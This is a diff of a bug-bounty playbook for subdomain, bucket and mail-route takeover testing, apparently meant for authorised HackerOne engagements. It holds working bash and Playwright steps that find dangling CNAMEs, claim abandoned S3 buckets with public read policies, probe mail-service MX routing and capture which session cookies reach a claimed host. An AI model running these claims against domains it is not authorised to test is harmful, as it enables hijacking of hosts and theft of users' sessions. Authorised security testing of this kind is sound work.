@@ -122,8 +122,9 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
   ```text
   GitHub Pages   <owner>.github.io                         There isn't a GitHub Pages site here.
   Heroku         <app>.herokuapp.com, <id>.herokudns.com   No such app  /  herokucdn.com/error-pages/no-such-app.html
-  AWS S3         <bucket>.s3[.-]<region>.amazonaws.com     <Code>NoSuchBucket</Code> ... <BucketName>the name</BucketName>
-                 <bucket>.s3-website[.-]<region>.amazonaws.com
+  AWS S3 (REST)  <bucket>.s3[.-]<region>.amazonaws.com     <Code>NoSuchBucket</Code> with <BucketName>the name</BucketName>
+  S3 website     <bucket>.s3-website[.-]<region>.amazonaws.com
+                                                           Code: NoSuchBucket, BucketName: the name (an HTML list)
   Fastly         *.fastly.net                              Fastly error: unknown domain: <host>
   Shopify        shops.myshopify.com                       Sorry, this shop is currently unavailable.
   Zendesk        <sub>.zendesk.com                         Help Center Closed
@@ -131,7 +132,7 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
   Netlify        <site>.netlify.app                        Not Found - Request ID:
   Surge          *.surge.sh                                project not found
   Pantheon       *.pantheonsite.io                         404 error unknown site!
-  Tumblr         domains.tumblr.com                        Whatever you were looking for doesn't currently exist at this address.
+  Tumblr         domains.tumblr.com                        Whatever you were looking for doesn't currently exist at this address.  /  There's nothing here.
   Unbounce       unbouncepages.com                         The requested URL was not found on this server.   (generic text: needs the CNAME too)
   Ghost          *.ghost.io                                The thing you were looking for is no longer here, or never was
   Help Scout     *.helpscoutdocs.com                       No settings were found for this company:
@@ -147,12 +148,13 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
     curl -sS "${HDR[@]}" -k --max-time 15 -D "$D/$s.hdr" -o "$D/$s.body" -w "$s / %{http_code} %{size_download}\n" "$s://$H/"
     curl -sS "${HDR[@]}" -k --max-time 15 -o "$D/$s-random.body" -w "$s random %{http_code}\n" "$s://$H/sto$RANDOM$RANDOM"
   done
-  grep -HoE "There isn't a GitHub Pages site here|<Code>NoSuchBucket</Code>|<BucketName>[^<]+|No such app|no-such-app|Fastly error: unknown domain|Sorry, this shop is currently unavailable|Help Center Closed|Project doesnt exist\.\.\. yet|Not Found - Request ID|project not found|404 error unknown site|Whatever you were looking for doesn't currently exist|There's nothing here|The thing you were looking for is no longer here|No settings were found for this company|This UserVoice subdomain is currently available|Do you want to register|Repository not found|The page you are looking for doesn't exist or has been moved" "$D"/*.body
+  grep -HoE "There isn't a GitHub Pages site here|NoSuchBucket|BucketName(>|: )[^<]+|No such app|no-such-app|Fastly error: unknown domain|Sorry, this shop is currently unavailable|Help Center Closed|Project doesnt exist\.\.\. yet|Not Found - Request ID|project not found|404 error unknown site|Whatever you were looking for doesn't currently exist|There's nothing here|The thing you were looking for is no longer here|No settings were found for this company|This UserVoice subdomain is currently available|Do you want to register|Repository not found|The page you are looking for doesn't exist or has been moved" "$D"/*.body
   # the service's row in the reference list: status and the discussion of how a claim works
   SVC=$(jq -r '."cname-3p".ev // empty' "$E/facts/$H.json" | sed -E 's/.*\(([^)]*)\)$/\1/'); echo "service: $SVC"
   gh api repos/EdOverflow/can-i-take-over-xyz/readme --jq .content | base64 -d | grep -iF "${SVC%% *}" | head -8
-  # a second opinion only: a template match is never the evidence
-  nuclei -u "$T" -tags takeover -type http -rl "$RATE" -c 2 -retries 0 -ni $HDRF -jsonl -o "$D/nuclei.jsonl"
+  # a second opinion only: a template match is never the evidence. -rl takes a literal at or under $RATE (the scope
+  # guard reads only a number there); one request a second is plenty for one host
+  nuclei -u "$T" -tags takeover -type http -rl 1 -c 2 -retries 0 -ni $HDRF -jsonl -o "$D/nuclei.jsonl"
   ```
 - **Proof:** none on its own. The saved `dig` chain and the matching body, next to the can-i-take-over-xyz row
   that calls the service claimable, make a candidate; the report needs the claim (STO-003).
@@ -166,7 +168,7 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
   its parent.
 - **Escalate:** STO-003 for the claim, the same hour. Record the outcome so the planner queues or closes it:
   `scripts/sane fact set "$H" dangling=1 --ev "https / answers 'No such app' (Heroku); listed Vulnerable"`, or
-  `dangling=0` with what the page really is. Several names on one deleted resource or one wildcard are one report
+  `dangling=0` with what the page is. Several names on one deleted resource or one wildcard are one report
   listing each host.
 
 ### STO-002 · The host's CNAME names an Azure or Elastic Beanstalk resource that no longer exists, and the provider offers that name to new customers
@@ -221,8 +223,8 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
   the provider generates (CloudFront `d<id>.cloudfront.net`, Heroku `<id>.herokudns.com`, Azure Front Door
   endpoints with a hash suffix): nobody can choose it. The resource type is retired: Azure Cloud Services
   (classic), behind `*.cloudapp.net`, was retired in 2024, so a name there counts only if a subscription can still
-  create one. The target answers SERVFAIL rather than NXDOMAIN: an outage or a dead delegation (STO-005), not a
-  deleted resource.
+  create one. The target answers SERVFAIL rather than NXDOMAIN: the provider's DNS failed for the moment, and a
+  deleted resource gives NXDOMAIN; retry later before drawing any conclusion.
 - **Escalate:** STO-003: create the resource under that label, in the same region, and bind `$H`. If the provider
   asks for a verification TXT record before it binds a custom name (App Service asks for one at `asuid.<name>`),
   the claim stops there: record `negative` with the error text. Several names on the same deleted resource are one
@@ -261,9 +263,10 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
   dig +noall +answer "$H" A > "$D/dig-before.txt"
   ```
   ```bash
-  # AWS S3 (NoSuchBucket in STO-001): the bucket is the <BucketName> the error printed; the region is in the CNAME
-  BK=$(grep -ohE '<BucketName>[^<]+' "$E/evidence/$H/STO-001/"*.body | head -1 | cut -d'>' -f2)
-  REG=$(dig +short CNAME "$H" | grep -oE 's3[.-](website[.-])?[a-z]{2}-[a-z]+-[0-9]' | grep -oE '[a-z]{2}-[a-z]+-[0-9]' || echo us-east-1)
+  # AWS S3 (NoSuchBucket in STO-001): the bucket is the BucketName the error printed (for a CNAME-mapped bucket it
+  # equals the host name); the region is in the CNAME chain, us-east-1 for the global s3.amazonaws.com
+  BK=$(grep -ohE 'BucketName(>|: )[^<]+' "$E/evidence/$H/STO-001/"*.body | head -1 | sed -E 's/^BucketName(>|: )//'); BK=${BK:-$H}
+  REG=$(dig +short "$H" A | grep -oE 's3[.-](website[.-])?[a-z]{2}-[a-z]+-[0-9]' | grep -oE '[a-z]{2}-[a-z]+-[0-9]' | head -1); REG=${REG:-us-east-1}
   aws s3api create-bucket --bucket "$BK" --region "$REG" $([ "$REG" = us-east-1 ] || echo "--create-bucket-configuration LocationConstraint=$REG")
   aws s3api put-public-access-block --bucket "$BK" --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=false,RestrictPublicBuckets=false
   aws s3api put-bucket-policy --bucket "$BK" --policy "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::$BK/$R.html\"}]}"
@@ -348,7 +351,7 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
   dig +noall +answer "$H" A > "$D/dig.txt"
   dig +noall +comments +authority SOA "$N" | tee "$D/soa.txt" | grep -E 'status:|[[:space:]]SOA[[:space:]]'
   Z=$(awk '$4=="SOA"{print $1; exit}' "$D/soa.txt" | sed 's/\.$//'); [ -n "$Z" ] || echo "no SOA: not an NXDOMAIN case"
-  DOM=$(echo "$N" | awk -F. -v z="$Z" '{n=split(z, a, "."); print $(NF-n) "." z}'); echo "zone $Z, registrable $DOM"
+  DOM=$(echo "$N" | awk -v FS=. -v z="$Z" '{n=split(z, a, "."); print $(NF-n) "." z}'); echo "zone $Z, registrable $DOM"
   # the zone must not be a registered domain itself (then the dead name lives inside someone's zone), the domain must be absent
   for x in "$Z" "$DOM"; do
     curl -sS "${HDR[@]}" -L -o "$D/rdap-$x.json" -w "rdap $x %{http_code} %{url_effective}\n" "https://rdap.org/domain/$x"; sleep 1
@@ -474,7 +477,7 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
   and the MX hosts of services where each customer adds its own domain: Mailgun (`mxa.mailgun.org`,
   `mxb.mailgun.org`, `mxa.eu.mailgun.org`), SendGrid Inbound Parse (`mx.sendgrid.net`), Postmark
   (`inbound.postmarkapp.com`), Amazon SES (`inbound-smtp.<region>.amazonaws.com`), Google Workspace and
-  Microsoft 365. No paid report of this form is in the library; the disclosed ones are on Mailgun.
+  Microsoft 365. No paid report of this form is in the library, and most of the disclosed ones name Mailgun.
 - **Test:** an NXDOMAIN MX host on a domain nobody holds is STO-004's check on that domain. For a mail service, add
   the domain to the operator's account there and see whether the service routes inbound mail for it before any DNS
   verification: services that want a TXT or DKIM record on the organisation's zone first (SES, Google Workspace,
@@ -499,7 +502,8 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
   ```bash
   # 3. one message from us to the one address the rule matches, sent straight to the service's MX. Outbound port 25 is
   #    often blocked: then send the same message from the operator's own mailbox.
-  M=$(awk '/mailgun\.org/{print $2; exit}' "$D/mx-services.txt"); MXH=$(awk -v m="$M" '$2==m{print $1; exit}' "$D/mx.txt")
+  M=$(grep -iE 'mailgun\.org|sendgrid\.net|postmarkapp\.com' "$D/mx-services.txt" | awk 'NR==1{print $2}')   # one candidate at a time
+  MXH=$(awk -v m="$M" '$2==m{print $1; exit}' "$D/mx.txt")
   U=$(jq -r '.authorisation.h1_username' "$E/engagement.json"); R=$(openssl rand -hex 8); echo "rule recipient: sto-$R@$M"
   python3 - "$MXH" "sto-$R@$M" "$U+sto@wearehackerone.com" <<'PY'
   import smtplib, sys
@@ -618,19 +622,19 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
   tr ' ;' '\n\n' < "$D/csp.txt" | grep -oiE '^(https?://)?(\*\.)?[a-z0-9][a-z0-9.-]*\.[a-z]{2,}' | sed -E 's#^https?://##; s#^\*\.##' >> "$D/hosts.txt"
   # 2. the hosts that do not resolve, with the zone that answered for each
   sort -u "$D/hosts.txt" | while read -r x; do
-    s=$(dig +noall +comments "$x" A | grep -oE 'status: [A-Z]+' | cut -d' ' -f2)
+    s=$(dig +noall +comments "$x" A | grep -oE 'status: [A-Z]+' | awk '{print $2}')
     [ "$s" = NOERROR ] || echo "$s $x $(dig +noall +authority SOA "$x" | awk '$4=="SOA"{print $1; exit}')"; sleep 0.2
   done | tee "$D/dead.txt"
-  # 3. per dead host: the registrable domain and its RDAP answer, the zone's RDAP answer, and the tags that use the host
-  while read -r s x z; do
-    dom=$(echo "$x" | awk -F. -v z="${z%.}" '{n=split(z, a, "."); print $(NF-n) "." z}')
+  # 3. per NXDOMAIN host: the registrable domain and its RDAP answer, the zone's RDAP answer, the tags that use the host
+  grep '^NXDOMAIN ' "$D/dead.txt" | while read -r s x z; do
+    dom=$(echo "$x" | awk -v FS=. -v z="${z%.}" '{n=split(z, a, "."); print $(NF-n) "." z}')
     dc=$(curl -sS "${HDR[@]}" -L -o /dev/null -w '%{http_code}' "https://rdap.org/domain/$dom")
     zc=$(curl -sS "${HDR[@]}" -L -o /dev/null -w '%{http_code}' "https://rdap.org/domain/${z%.}")
     echo "$x: domain $dom rdap $dc, zone ${z%.} rdap $zc"; grep -oiE "<(script|link|iframe|object|form|img|a)[^>]*${x//./\\.}[^>]*>" "$D/pages.html" | head -3; sleep 1
-  done < "$D/dead.txt" | tee "$D/verdict.txt"                # domain 404 and zone not 200: the domain can be bought
+  done | tee "$D/verdict.txt"                                 # domain 404 and zone not 200: the domain can be bought
   ```
   ```bash
-  # 4. with the scriptable browser: the requests the pages really make, and the ones that fail on DNS
+  # 4. with the scriptable browser: the requests the pages make when loaded, and the ones that fail on DNS
   cat > "$D/net.js" <<'JS'
   // usage: net.js <base URL> <comma-separated paths> <the HDR arguments>
   const { chromium } = require('playwright');
@@ -707,8 +711,8 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
   ```bash
   # 4. claim (takeover-ok): the bucket, private except for one object, the proof. Nothing at the keys the application
   #    requests, so none of its users receives anything from us. S3 shown; the region is in the reference, else us-east-1
-  r=$(awk '/NoSuchBucket/{print $NF; exit}' "$D/exists.txt"); BK=$(echo "$r" | sed -E 's#^s3[.-]([a-z0-9-]+\.)?amazonaws\.com/##; s#\.s3[.-].*$##')
-  REG=$(echo "$r" | grep -oE '[a-z]{2}-[a-z]+-[0-9]' || echo us-east-1)
+  r=$(awk '/NoSuchBucket/ && /amazonaws/{print $NF; exit}' "$D/exists.txt"); BK=$(echo "$r" | sed -E 's#^s3[.-]([a-z0-9-]+\.)?amazonaws\.com/##; s#\.s3[.-].*$##')
+  REG=$(echo "$r" | grep -oE '[a-z]{2}-[a-z]+-[0-9]' | head -1); REG=${REG:-us-east-1}
   U=$(jq -r '.authorisation.h1_username' "$E/engagement.json"); R=$(openssl rand -hex 16)
   printf '<!doctype html><meta name="robots" content="noindex,nofollow"><!-- bucket takeover proof by HackerOne user %s --><p>%s %s</p>\n' "$U" "$BK" "$R" > "$D/$R.html"
   aws s3api create-bucket --bucket "$BK" --region "$REG" $([ "$REG" = us-east-1 ] || echo "--create-bucket-configuration LocationConstraint=$REG")
@@ -718,6 +722,8 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
   # through the same URL form the application uses (outside us-east-1 the global name can take a while to follow)
   curl -sS "${HDR[@]}" -k -L -D- "https://$r/$R.html" | tee "$D/proof.txt" | grep -c "$R"
   printf 's3://%s claimed %s\n' "$BK" "$(date -u +%FT%TZ)" >> "$E/cleanup.md"
+  # Google Cloud Storage, same rules: gcloud storage buckets create "gs://$BK" --uniform-bucket-level-access, upload only
+  # the proof, then grant allUsers roles/storage.objectViewer. A name with dots needs a verified domain there: not claimable.
   ```
 - **Proof:** the line in the page, bundle or script that references the bucket (file and position), `NoSuchBucket`
   (or NXDOMAIN for an Azure account) before the claim, then our proof object served from the bucket through the
@@ -728,7 +734,8 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
   and nothing fetches it: Low, and most programmes close it as informative. The reference comes from a third
   party's script that the page includes (`third-party`: tell the operator). The Azure account exists but the
   container does not (`ContainerNotFound`): only the account's owner can create containers. The name is in a
-  partition we cannot create in (AWS GovCloud or China).
+  partition we cannot create in (AWS GovCloud or China). The programme closes takeovers without a working claim
+  (`takeover`) and the claim was not made: `NoSuchBucket` alone is then informative there.
 - **Escalate:** a script on the application origin loaded from the bucket is stored XSS for every visitor
   (#1598347): show it with XSS-018 in our own browser, answering the referenced URL locally instead of placing a
   script in the bucket. An installer, update or build input fetched from it is code execution on users' or the
@@ -748,8 +755,9 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
 | **Prior art** | #219205, #335330, #172137 |
 
 - **Where:** runs once per programme when any host is `dangling`: the claimed host recorded by STO-003, STO-004
-  or STO-005 (`$E/evidence/<host>/STO-00N/claimed.txt`: host, proof path, time) against every application on the
-  same parent domain where we hold an account. The single sign-on host and the main application first: their
+  or STO-005 (`$E/evidence/<host>/STO-00N/claimed.txt`, one line: host, proof path starting with `/`, time; write
+  that line by hand for a web proof made under STO-004 or STO-005) against every application on the same parent
+  domain where we hold an account. The single sign-on host and the main application first: their
   cookies are the ones scoped widest.
 - **Test:** a cookie set with `Domain=example.com` (stored as `.example.com`) is sent by the browser to every host
   under `example.com`, the claimed one included, whatever its `SameSite` value (the claimed host is same-site) and
@@ -760,22 +768,24 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
 - **How:**
   ```bash
   source "$E/env.sh"; D="$E/evidence/@programme/STO-010"; mkdir -p "$D"
-  read -r CH CP _ < <(cat "$E"/evidence/*/STO-00[345]/claimed.txt 2>/dev/null | head -1); echo "claimed host $CH, proof $CP"
+  read -r CH CP _ < <(cat "$E"/evidence/*/STO-00[345]/claimed.txt 2>/dev/null | awk '$2 ~ /^\//' | head -1); echo "claimed host $CH, proof $CP"
   # 1. B's cookies with their Domain, from a storage state saved after logging B in once in the browser:
   #    npx --yes playwright open --save-storage="$E/accounts/B.state.json" "<the application's login page>"
   jq -r '.cookies[] | [.domain, .name, (.httpOnly | tostring), (.secure | tostring), .sameSite] | @tsv' "$E/accounts/B.state.json" | tee "$D/cookies.tsv"
   awk -F'\t' -v h=".$CH" '$1 ~ /^\./ && substr(h, length(h) - length($1) + 1) == $1' "$D/cookies.tsv" | tee "$D/reach-claimed.tsv"
   # 2. the browser, holding B's state, opens the proof page; print the Cookie header it sent, values cut to 4+4 characters
   cat > "$D/send.js" <<'JS'
-  // usage: send.js <proof URL on the claimed host> <storage state file> <output file>
+  // usage: send.js <proof URL on the claimed host> <storage state file> <output file> <the HDR arguments>
   const { chromium } = require('playwright'), fs = require('fs');
   (async () => {
-    const [url, state, out] = process.argv.slice(2), b = await chromium.launch(), c = await b.newContext({ storageState: state }), p = await c.newPage();
+    const [url, state, out, ...h] = process.argv.slice(2), hd = {}; let ua;
+    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
+    const b = await chromium.launch(), c = await b.newContext({ storageState: state, userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
     p.on('request', async r => { if (r.url() === url) fs.writeFileSync(out, ((await r.allHeaders()).cookie || '(no cookie header)').replace(/=([^;]{4})[^;]*([^;]{4})/g, '=$1...$2') + '\n'); });
     await p.goto(url).catch(e => console.log(String(e))); await p.waitForTimeout(1500); await p.screenshot({ path: out + '.png' }); await b.close();
   })();
   JS
-  for s in https http; do NODE_PATH="$(npm root -g)" node "$D/send.js" "$s://$CH$CP" "$E/accounts/B.state.json" "$D/sent-$s.txt"; done
+  for s in https http; do NODE_PATH="$(npm root -g)" node "$D/send.js" "$s://$CH$CP" "$E/accounts/B.state.json" "$D/sent-$s.txt" "${HDR[@]}"; done
   cat "$D"/sent-*.txt
   # 3. which of those names is B's session: the cookie in the headers $B sends
   grep -i '^cookie:' "$E/accounts/B.headers" | sed 's/^[Cc]ookie: *//' | tr ';' '\n' | cut -d= -f1 | sed 's/^ *//' | sort -u
@@ -845,6 +855,10 @@ names) → STO-009 (bucket names the pages use) → STO-008 (script and frame so
   or domain runs our script despite the policy.
 - STO-003, STO-004, STO-005 → AUT-016 and XSS-016: the claimed host can set cookies for the parent domain: a fixed
   session, or a cookie value the application writes into its pages.
+- STO-003, STO-004, STO-005 → CSR-011 and CSR-004: the claimed host is same-site with the application, so its pages
+  send requests that carry `SameSite=Lax` and `Strict` cookies, and it can plant a double-submit CSRF cookie.
+- STO-003, STO-004, STO-005 → RDR items: a redirect or `next=` allow-list that accepts any subdomain forwards to the
+  claimed host.
 - STO-008, STO-009 → XSS-018: script loaded into the application origin is stored XSS for every visitor; XSS-018
   carries it to account takeover, in our own accounts.
 - STO-005 → STO-006: a held zone answers MX too, and TXT records that SaaS providers accept as proof of domain
